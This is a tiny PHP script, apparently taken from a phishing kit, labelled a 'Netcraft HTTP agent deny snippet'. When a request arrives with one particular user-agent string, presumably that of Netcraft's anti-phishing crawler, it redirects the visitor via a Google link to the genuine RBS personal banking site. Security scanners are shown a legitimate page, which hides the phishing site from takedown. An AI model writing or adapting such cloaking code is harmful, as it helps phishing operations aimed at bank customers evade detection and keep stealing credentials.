<?php

# Netcraft HTTP agent deny snippet

if ($v_agent == "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727)") {

        header("Location: https://www.google.ie/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwj5w4vEuanLAhUGuRQKHYd_D4MQFggbMAA&url=http%3A%2F%2Fpersonal.rbs.co.uk%2F&usg=AFQjCNFYepvxIdwo2Mjnx1bPJfbEHs3vQw&bvm=bv.116274245,d.d24");
		die();

}

?>